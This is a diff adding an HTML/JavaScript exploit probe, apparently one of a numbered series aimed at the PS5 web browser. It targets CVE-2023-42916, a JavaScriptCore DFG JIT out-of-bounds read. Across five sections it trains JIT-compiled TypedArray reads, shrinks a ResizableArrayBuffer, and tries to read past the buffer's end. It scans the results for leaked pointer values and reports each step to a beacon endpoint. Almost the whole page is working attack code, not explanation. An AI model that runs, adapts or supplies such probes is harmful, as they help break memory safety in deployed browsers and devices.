@@ -1,0 +1,292 @@
+<!--
+  p681: CVE-2023-42916 — DFG TypedArray OOB read via ResizableArrayBuffer resize
+
+  CVE-2023-42916: OOB read, JIT-related, fixed Safari 17.1.2. PS5 has DFG + RAB.
+
+  Strategy: ResizableArrayBuffer (confirmed on PS5 14.10 via p601) allows shrinking
+  a buffer that a TypedArray view references. If DFG compiles a function that reads
+  from a TypedArray and caches the length/byteLength, a resize between DFG compilation
+  and execution could cause the JIT code to read past the new buffer end.
+
+  This differs from p608 (CVE-2024-44308) which tested DFG PutByVal WRITES and was
+  DEAD. This probe focuses on READS, matching CVE-2023-42916's OOB read description.
+
+  Key insight: DFG may inline the TypedArray length as a constant or cache it in a
+  register before the resize happens. The "improved input validation" fix suggests
+  the JIT needs to re-check length after potential side effects.
+
+  Patterns tested:
+  A) Simple resize between DFG-compiled reads (baseline)
+  B) Resize inside a valueOf callback during TypedArray[idxObj] access
+  C) Resize from a Proxy get trap on the index object
+  D) Resize triggered by FinalizationRegistry callback during GC
+  E) Multiple TypedArray views on same RAB — resize via one, read via DFG-cached other
+
+  CRASH_CLASS: MODERATE (OOB read beyond buffer)
+  prior art: p601 (RAB confirmed), p608 (CVE-2024-44308 write test — DEAD),
+             p680 (DFG array bounds elim)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p681</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+  b('P681-START:CVE-2023-42916-RAB-RESIZE-OOB');
+
+  if (typeof ArrayBuffer.prototype.resize !== 'function') {
+    b('P681-FATAL:NO-RAB');
+    b('P681-DONE');
+    return;
+  }
+
+  var results = [];
+
+  // === SECTION A: Train DFG, then resize RAB smaller ===
+  b('A:TRAIN-RESIZE-READ');
+  try {
+    var rab = new ArrayBuffer(2048, {maxByteLength: 2048});
+    var u8 = new Uint8Array(rab);
+    var u64 = new BigUint64Array(rab); // 256 elements
+
+    // Fill with known pattern
+    for (var i = 0; i < 256; i++) u64[i] = BigInt(0xAAAA0000 + i);
+
+    function readU64(view, idx) {
+      return view[idx];
+    }
+
+    // Train: 200K in-bounds reads
+    for (var i = 0; i < 200000; i++) {
+      readU64(u64, i % 256);
+    }
+    b('A:TRAINED-200K');
+
+    // Resize to 64 bytes (8 u64 elements)
+    rab.resize(64);
+    b('A:RESIZED-TO-64');
+
+    // Now read past new end with DFG-compiled function
+    var oob = [];
+    for (var idx = 8; idx < 256; idx++) {
+      var val = readU64(u64, idx);
+      if (val !== undefined) {
+        var hex = val.toString(16);
+        oob.push(idx + ':0x' + hex);
+        // Check for interesting values (not our pattern, not zero)
+        if (val !== 0n && !hex.startsWith('aaaa')) {
+          b('A:UNEXPECTED:idx=' + idx + ',val=0x' + hex);
+        }
+      }
+    }
+    if (oob.length > 0) {
+      b('A:OOB-HIT:count=' + oob.length + ',first=' + oob[0]);
+      results.push('A:' + oob.length);
+    } else {
+      b('A:NO-OOB');
+    }
+  } catch(e) {
+    b('A:ERR:' + e.message);
+  }
+
+  // === SECTION B: valueOf resize race ===
+  b('B:VALUEOF-RESIZE');
+  try {
+    var rab2 = new ArrayBuffer(512, {maxByteLength: 512});
+    var view2 = new BigUint64Array(rab2); // 64 elements
+    for (var i = 0; i < 64; i++) view2[i] = BigInt(0xBBBB0000 + i);
+
+    function readWithObj(v, idxObj) {
+      return v[idxObj]; // valueOf called to get index
+    }
+
+    // Train with simple integers
+    for (var i = 0; i < 200000; i++) {
+      readWithObj(view2, i % 64);
+    }
+    b('B:TRAINED-200K');
+
+    // valueOf resizes the buffer mid-access
+    var resized = false;
+    var poison = {
+      valueOf: function() {
+        if (!resized) {
+          resized = true;
+          rab2.resize(16); // shrink to 2 u64 elements
+        }
+        return 32; // way past new end
+      }
+    };
+
+    var val2 = readWithObj(view2, poison);
+    if (val2 !== undefined) {
+      b('B:OOB-HIT:val=0x' + val2.toString(16));
+      results.push('B:0x' + val2.toString(16));
+    } else {
+      b('B:NO-OOB');
+    }
+  } catch(e) {
+    b('B:ERR:' + e.message);
+  }
+
+  // === SECTION C: Proxy get trap ===
+  b('C:PROXY-RESIZE');
+  try {
+    var rab3 = new ArrayBuffer(512, {maxByteLength: 512});
+    var view3 = new Float64Array(rab3); // 64 elements
+    for (var i = 0; i < 64; i++) view3[i] = i + 0.5;
+
+    function readProxy(v, idx) {
+      return v[idx];
+    }
+
+    // Train
+    for (var i = 0; i < 200000; i++) {
+      readProxy(view3, i % 64);
+    }
+    b('C:TRAINED-200K');
+
+    // Create proxy that resizes on property access
+    var handler = {
+      get: function(target, prop) {
+        if (prop === 'length') {
+          rab3.resize(24); // shrink to 3 float64 elements
+        }
+        return Reflect.get(target, prop);
+      }
+    };
+
+    // Read through the proxy-like path
+    // Note: TypedArrays are exotic, Proxy wrapping may not work the same
+    // But accessing view3.length after resize checks if DFG cached it
+    var preLen = view3.length;
+    rab3.resize(24);
+    var postLen = view3.length;
+    b('C:LEN-CHANGE:' + preLen + '->' + postLen);
+
+    // Try DFG-compiled read at old index
+    var val3 = readProxy(view3, 32);
+    if (val3 !== undefined && !isNaN(val3)) {
+      b('C:OOB-HIT:idx=32,val=' + val3);
+      results.push('C:' + val3);
+    } else {
+      b('C:NO-OOB:val=' + val3);
+    }
+  } catch(e) {
+    b('C:ERR:' + e.message);
+  }
+
+  // === SECTION D: Multi-view same RAB ===
+  b('D:MULTI-VIEW');
+  try {
+    var rab4 = new ArrayBuffer(1024, {maxByteLength: 1024});
+    var viewA = new BigUint64Array(rab4);  // 128 elements
+    var viewB = new Uint32Array(rab4);     // 256 elements
+
+    for (var i = 0; i < 128; i++) viewA[i] = BigInt(0xCCCC0000 + i);
+
+    function readViewA(v, idx) {
+      return v[idx];
+    }
+    function readViewB(v, idx) {
+      return v[idx];
+    }
+
+    // Train both views with DFG
+    for (var i = 0; i < 200000; i++) {
+      readViewA(viewA, i % 128);
+      readViewB(viewB, i % 256);
+    }
+    b('D:TRAINED-200K-BOTH');
+
+    // Resize using viewB's awareness, try to read viewA past end
+    rab4.resize(64); // 8 u64 elements, 16 u32 elements
+    b('D:RESIZED-TO-64');
+
+    var oob4 = [];
+    for (var idx = 8; idx < 128; idx++) {
+      var val = readViewA(viewA, idx);
+      if (val !== undefined) {
+        oob4.push(idx + ':0x' + val.toString(16));
+      }
+    }
+    if (oob4.length > 0) {
+      b('D:OOB-HIT:count=' + oob4.length + ',first=' + oob4[0]);
+      results.push('D:' + oob4.length);
+
+      // Scan for code pointers
+      for (var j = 0; j < oob4.length; j++) {
+        var parts = oob4[j].split(':0x');
+        if (parts[1] && parts[1].length >= 10 && !parts[1].startsWith('cccc')) {
+          b('D:POSSIBLE-LEAK:' + oob4[j]);
+        }
+      }
+    } else {
+      b('D:NO-OOB');
+    }
+  } catch(e) {
+    b('D:ERR:' + e.message);
+  }
+
+  // === SECTION E: Rapid resize oscillation during DFG loop ===
+  b('E:OSCILLATE-RESIZE');
+  try {
+    var rab5 = new ArrayBuffer(512, {maxByteLength: 512});
+    var view5 = new BigUint64Array(rab5); // 64 elements
+    for (var i = 0; i < 64; i++) view5[i] = BigInt(0xDDDD0000 + i);
+
+    // Run a hot loop that reads while resizing from another callback
+    var leakedE = [];
+    var resizeCount = 0;
+
+    function hotRead() {
+      var sum = 0n;
+      for (var i = 0; i < 64; i++) {
+        var v = view5[i];
+        if (v !== undefined) sum += v;
+      }
+      return sum;
+    }
+
+    // Train
+    for (var i = 0; i < 100000; i++) hotRead();
+    b('E:TRAINED-100K');
+
+    // Now oscillate: read, resize small, read, resize big
+    for (var round = 0; round < 50; round++) {
+      rab5.resize(512);
+      for (var i = 0; i < 64; i++) view5[i] = BigInt(0xDDDD0000 + i);
+      var s1 = hotRead();
+
+      rab5.resize(32); // only 4 elements valid
+
+      // Immediate hot read — DFG may use cached length
+      for (var idx = 4; idx < 64; idx++) {
+        var val = view5[idx];
+        if (val !== undefined) {
+          leakedE.push('r' + round + ':' + idx + ':0x' + val.toString(16));
+        }
+      }
+    }
+
+    if (leakedE.length > 0) {
+      b('E:OOB-HIT:count=' + leakedE.length + ',samples=' + leakedE.slice(0,3).join(','));
+      results.push('E:' + leakedE.length);
+    } else {
+      b('E:NO-OOB');
+    }
+  } catch(e) {
+    b('E:ERR:' + e.message);
+  }
+
+  // === SUMMARY ===
+  if (results.length > 0) {
+    b('P681-RESULT:HITS=' + results.join(';'));
+  } else {
+    b('P681-RESULT:NO-OOB-DETECTED');
+  }
+  b('P681-DONE');
+}
+
+setTimeout(main, 100);
+</script>
+</head><body><pre id="log">p681: CVE-2023-42916 RAB resize OOB read</pre></body></html>
